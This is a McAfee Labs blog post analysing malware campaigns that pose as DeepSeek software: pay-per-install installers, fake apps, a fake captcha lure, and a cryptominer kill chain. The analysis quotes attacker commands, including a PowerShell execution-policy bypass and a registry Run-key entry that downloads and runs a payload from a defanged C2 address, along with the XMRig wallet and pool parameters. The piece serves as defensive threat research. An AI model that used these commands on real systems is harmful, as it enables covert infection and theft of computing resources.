---
title: "Look Before You Leap: Imposter DeepSeek Software Seek Gullible Users"
date: 2025-03-19
---

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/300x200_Blog_Deepseek-Mobile-Phone-300x200.png)

_Authored by Aayush Tyagi and M, Mohanasundaram_ 

**\*Bold = Term Defined in Appendix**

In this blog, we discuss how malware authors recently utilized a popular new trend to entice unsuspecting users into installing malware. This blog is meant as a reminder to stay cautious during a hype cycle. It’s a common trap and pitfall for unassuming consumers. 

## Background

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-13-at-6.14.27-PM.png)

_**Figure 1: DeepSeek Google Search Trend from 1st January to 7th March**_ 

Malware creators frequently exploit trending search terms through hashtags and SEO manipulation to boost visibility and climb search rankings. This tactic, known as SEO poisoning, helps drive traffic to malicious sites, increasing downloads or earning rewards through affiliate programs. Recently, “AI” (Artificial Intelligence) has been one of the most popular keywords leveraged in these scams. Earlier this year, “DeepSeek” also gained traction, even surpassing “Nvidia” at its peak in search interest.

Let’s look at how we got here. Artificial Intelligence (AI) tools are transforming the world at an unprecedented pace, right before our eyes. In recent years, we’ve witnessed remarkable advancements in Generative AI, from the development of highly successful frontier of LLM’s (Large Language Models) such as ChatGPT, Gemini, LLaMA, Grok, etc., to their applications as coding assistants (GitHub Co-pilot or Tabnine), meeting assistants, and voice cloning software among the more popular ones.

These tools are pervasive and easily available at your fingertips. In today’s world AI isn’t just a complicated term utilized by select organizations, it’s now adopted by every household in one way or another and is reshaping entire industries and economies.  

With the good comes the bad, and unfortunately AI has enabled an accelerated ecosystem of scammers adopting these tools – examples are: 

- creating deepfake videos for fake propaganda or fake advertising 

- creating voice clones for “hey mum” scams or imposter scam voice mails from the IRS 

- generating almost perfect-sounding text and emails for socially engineered scams leading to phishing 

- generation of images to evoke sentiments resulting in charity scams 

Besides the application of AI tools that empower scammers, there is the good old use case of piggybacking on popular news trends, where popular search terms are used to bait gullible users (read our blog on how game cracks are used as lures to deliver malware). One such popular news-worthy term that is being abused is _DeepSeek,_ which McAfee discussed early this year. 

## Jumping on the DeepSeek-Hype Bandwagon  

The launch of the DeepSeek-R1 model (by DeepSeek, a Chinese company) generated significant buzz. The model is claimed to have been innovated so that the cost of building and using the technology is a fraction1 of the cost compared to other Generative AI models such as OpenAI’s GPT-4o or Meta’s Llama 3.1. Moreover, the R1 model was released in January 2025 under an Open-Source license.  

Within a few days of the release of the DeepSeek-R1 model, the Deepseek AI assistant—a chatbot for the R1 model—was launched on the Apple App Store and later the Google Play Store. In both app stores, Deepseek’s chatbot, which is an alternative to OpenAI’s ChatGPT, took the No. 1 spot and has been downloaded over 30 million times.  

This stirred up the curiosity of many who wanted to experiment with the model. The interest spiked to a point where the DeepSeek website wasn’t available at times due to the sheer volume of people trying to set up accounts or download their app. This sense of excitement, anxiety, and impatience is exactly what scammers look for in their victims. It wasn’t shortly after the term went “viral” that scammers saw an opportunity and began cloaking malware disguised as DeepSeek. Various malware campaigns followed, which included Crypto-miners, fake installers, DeepSeek impersonator websites, and fake DeepSeek mobile apps.  

## First Things First – Am I Protected? 

At McAfee Labs, we work hard to keep you safe, but staying informed is always a smart move. When navigating trending news stories, it’s important to stay cautious and take necessary precautions. We continuously track emerging threats across multiple platforms—including Windows, macOS, Android, iOS, and ChromeOS—to ensure our customers remain protected. While we do our part, don’t forget to do yours: enable Scam Protection, Web Protection, and Antivirus in your preferred security product.

McAfee products offer advanced AI-powered protection across all tiers—Basic, Essential, Premium, Advanced, and Ultimate. Our AI-Suite includes features like AI-powered Antivirus, Text Scam Detection, Web Protection, VPN, and Identity Protection, providing comprehensive security.

Check out McAfee Scam Detector, which enhances our ability to combat a wide range of scams and is included in our products at no extra cost.

For more tips on avoiding scams and staying safe online, visit the McAfee Smart AI Hub at mcafee.ai. You can also explore the latest insights on the State of the Scamiverse on McAfee’s blog and stay up to date on scam prevention strategies.

Together, we can outsmart scammers and make the internet safer for everyone.

## DeepSeek Malware Campaign Examples 

In the rest of this article, we use simple examples to delve into more technical details for those seeking more analysis details. 

McAfee Labs uncovered a variety of DeepSeek-themed malware campaigns attempting to exploit its popularity and target tech savvy users. Multiple malware families were able to distribute their latest variants under the false pretense of being DeepSeek software.  

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.18.18-PM.png)

**_Figure 2: Attack Vector_** 

Users encounter some threats while searching for information about DeepSeek AI on the internet. They encountered websites offering DeepSeek installers for different platforms, such as Android, Windows and Mac. McAfee Labs found a number of such installers were trojanized or just repackaged applications. We identified multiple instances of Keyloggers, Crypto miners, Password Stealers, and Trojan Downloaders being distributed as DeepSeek installers.  

### Example 1: Fake Installers and Fake Android Apps 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-13-at-6.45.39-PM.png)

_**Figure 3: DeepSeek Installers**_

In Figure 3, we encountered fake installers, which distribute Third-Party software, such as winManager (highlighted in red) and Audacity (highlighted in blue).  

In the simplest abuse of the DeepSeek name, certain affiliates were able to spike their partner downloads and get a commission based on pay-per-install partner programs. Rogue affiliates use this tactic to generate revenue through forced installations of partner programs.  

Additionally similar software installers were also observed utilizing the DeepSeek Icon to appear more believable or alternatively use click ads and modify browser settings (such as modify the search engine) with the goal of generating additional ad revenue. 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-13-at-6.47.20-PM.png)

_**Figure 4: winManager (left) and Audacity (right)**_

The Deepseek icon was also misused by multiple Android applications to deceive users into downloading unrelated apps, thereby increasing download counts and generating revenue. 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-13-at-6.48.27-PM.png)

_**Figure 5: Android files abusing DeepSeek’s Logo**_

### Example 2: Fake Captcha Page 

We also encountered DeepSeek-Themed Fake-Captcha Pages. This isn’t new and has been a popular technique used as recently as 6 months ago by LummaStealer 

Fake captcha – is a fake webpage, asking users to verify that they are human, but instead, tricks the user into downloading and executing malicious software. This malware can steal login credentials, browser information etc.  

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-13-at-6.50.14-PM.png)

_**Figure6: Fake Captcha Page**_ 

In this instance, the website deepseekcaptcha\[.\]top pretends to offer a partnership program for content creators. They are utilizing the technique called ‘Brand Impersonation’, where they’re using DeepSeek’s Icons and color scheme to appear as the original website. 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-13-at-6.52.20-PM.png)

_**Figure 7: deepseekcaptcha\[.\]top**_

Once the user registers for the program, they’re redirected to the fake captcha page. 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.31.54-PM.png)

_**Figure 8: Fake Captcha Page hosted on the website**_ 

Here, as shown above, to authenticate, the user is asked to open the verification window by pressing the Windows + R key and then pressing CTRL + V to verify their identity.  

The user would observe a screen as shown in figure 9.  

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.35.21-PM.png)

_**Figure 9: Windows Run panel after copying the CMD**_ 

On clicking ‘OK’, malware will be installed that can steal browser and financial information from the system. 

McAfee’s Web Advisor protects against such threats. In this instance, the fake captcha page was blocked and marked as suspicious before it could be accessed. Even if you aren’t a McAfee customer, check out browser plugin for free.  

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.38.21-PM.png)

_**Figure 10: McAfee blocking malicious URL**_ 

### Example 3: Technical Analysis of a Crypto Miner 

In this section we talk about a **\*****Cryptominer** malware that was masquerading as DeepSeek. By blocking this initial payload, we prevent a chain of events (Fig 11.) on the computer that would have led to reduced performance on the device and potentially expose your device to further infection attempts. 

Some examples names used by the initial loader are were: 

- DeepSeek-VL2.Developer.Edition.exe 

- DeepSeek-R1.Leaked.Version.exe 

- DeepSeek-VL2.ISO.exe 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-13-at-7.12.26-PM.png)

_**Figure 11: CryptoMiner KillChain**_

### Initial Execution 

Once installed, this malware communicates with its **\*****C&C** **(**Command and Control) to download and execute a **\*****PowerShell** script. Figure 12 (a) and (b) show the malware connecting it’s IP address to download chunks of a script file which is then stored to the AppDataRoaming folder as _installer.ps1_  

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.20.21-PM.png)

_**Figure 12(a): Sample connects to C&C IP Address**_ 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.21.00-PM.png)

_**Figure 12(b): Installer.ps1 stored in Roaming folder**_

### Injection  

An attempt is made to bypass system policies and launch the script 

- _/c powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File “C:UsersadminAppDataRoaminginstaller.ps1_ 

- The ‘installer.ps1’ contains malicious code which will be injected and executed using a technique called **\*****Process Injection**  (Figure 14) 

- Figure 13 shows how the malware encodes this script to avoid detection 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.21.30-PM.png)

_**Figure 13: Base64 Encoded Malicious Code**_

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.22.58-PM.png)

_**Figure 14: PowerShell code for Process Injection.**_

### **\*Persistence**  

Malware attempts to maintain persistence on the Victim’s computer.  

- It executes reg.exe with the following command line (Fig 15) 

- reg add “HKEY\_CURRENT\_USERSoftwareMicrosoftWindowsCurrentVersionRun” /v WindowsUpdate /t REG\_SZ /d “powershell -ExecutionPolicy Bypass -NoProfile -Command Invoke-WebRequest -Uri 45\[.\]144\[.\]212\[.\]77:16000/client -OutFile C:UsersadminAppDataRoamingMicrosoftWindowsStart MenuProgramsStartuprunps.exe; Start-Process C:UsersadminAppDataRoamingMicrosoftWindowsStart MenuProgramsStartuprunps.exe” /f 

 ![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.24.25-PM.png)

_**Figure 15: Creating Run Key entry to maintain persistence**_

- This command retrieves a file named client.exe from the C2 server, saves it in the ProgramsStartup as runps.exe, and executes it as its **\*****Payload**. The file runps.exe is identified as **\*****XMRig** mining software.  

### Payload 

- To initiate the mining process, it connects to the same C2 server and downloads additional parameters.  

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.25.26-PM.png)

_**Figure 16: HTTP response that contains additional parameters**_ 

**\[{“address”:”494k9WqKJKFGDoD9MfnAcjEDcrHMmMNJTUun8rYFRYyPHyoHMJf5sesH79UoM8VfoGYevyzthG86r5BTGYZxmhENTzKajL3″,”idle\_threads”:90,”idle\_time”:1,”password”:”x”,”pool”:”pool.hashvault.pro:443″,”task”:”FALLEN|NOTASK”,”threads”:40}\]** 

- These are parameters used to identify the wallet address. 

- The payload injects into Notepad.exe (a legitimate windows process) uses the downloaded parameters to start the mining process. 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.26.22-PM.png)

_**Figure 17: Notepad.exe being executed with additional parameters**_ 

- We can further understand malware’s behavior by analyzing the downloaded information.
    - - **–donate-level 2**: The Donation level is set at 2%. I.e., 2% of the total mining time will be donated to XMRig developers.  
        
        - **\-o pool.hashvault.pro:443**: This specifies the mining pool to connect to; pool.hashvault.pro (in this case) 
        
        - **\-u 494k9WqKJKFGDoD9MfnAcjEDcrHMmMNJTUun8rYFRYyPHyoHMJf5sesH79UoM8VfoGYevyzthG86r5BTGYZxmhENTzKajL3:** This is the wallet address where the mined cryptocurrency is sent.  
        
        - **–cpu-max-threads-hint=40** indicates the number of CPU threads used for mining. In this instance, 40% of the available threads will be used. This limit prevents the system from slowing down, and the mining will remain unnoticed. 
        
        - **No GPU Flags:** Here, the GPU is not used in mining, which prevents any GPU detection tools from flagging the mining process.
- Upon further analysis, We noticed that it is used to mine **\*****Monero** Cryptocurrency, and it hasn’t been reported for any scams yet. 

![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screenshot-2025-03-04-at-3.27.07-PM.png)

_**Figure 18: Wallet status for the captured wallet address**_ 

#### Why Monero? 

The attacker purposely mines Monero Cryptocurrency, as it prioritizes anonymity, making it impossible to track the movements of funds. This makes it a popular coin by a number of crypto-miners 

## Appendix of Terms 

### _Powershell_ 

PowerShell is a cross-platform command-line shell and scripting language developed by Microsoft, primarily used for task automation and configuration management and streamlined administrative control across Windows, Linux, and macOS environments worldwide. 

### Cryptominer 

A cryptominer is software or hardware that uses computing power to validate cryptocurrency transactions, secure decentralized networks, and earn digital currency rewards, often straining system resources and raising energy consumption. _When used in the context of malware, it is_ unauthorized software that covertly uses infected devices to mine cryptocurrency, draining resources, slowing performance, increasing energy costs, and often remaining difficult to detect or remove. 

### Process Injection 

This is a term used to describe a technique where malware injects and overwrites legitimate processes in memory, thereby modifying their behavior to run malicious code and bypassing security measures. The target processes are typically trusted processes. 

### _C&C_ 

C&C (Command and Control) is a communication channel used by attackers to remotely issue commands, coordinate activities, and data from compromised systems or networks. 

### _Persistence_ 

This term refers to the techniques that malware or an attacker uses to maintain long-term access to a compromised system, even after reboots, logouts, or security interventions. Persistence ensures that the malicious payload or backdoor remains active and ready to execute even if the system is restarted or the user tries to remove it. 

### _Payload_ 

In malware, a payload is the main malicious component delivered or executed once the infection occurs, enabling destructive activities such as data theft, system damage, resource hogging or unauthorized control and infiltration. 

### _XMRig_ 

XMRig is an open-source cryptocurrency mining software primarily used for mining Monero. It was originally developed as a legitimate tool for miners to efficiently utilize system resources to mine Monero using CPU and GPU power. However, due to its open-source nature and effectiveness, XMRig has become a popular tool for cryptominers. 

### _Monero_ 

Monero (XMR) is a privacy-focused cryptocurrency that prioritizes anonymity, security, and decentralization. Launched in April 2014, Monero is designed to provide untraceable and unlinkable transactions, making it difficult for outside parties to monitor or track the movement of funds on its blockchain. It operates on a decentralized, peer-to-peer network  but with enhanced privacy features. 

### Indicators of Compromise (IoCs) 

 ![](https://www.mcafee.com/blogs/wp-content/uploads/2025/03/Screen-Shot-2025-03-17-at-1.56.34-PM.png)

The post Look Before You Leap: Imposter DeepSeek Software Seek Gullible Users appeared first on McAfee Blog.
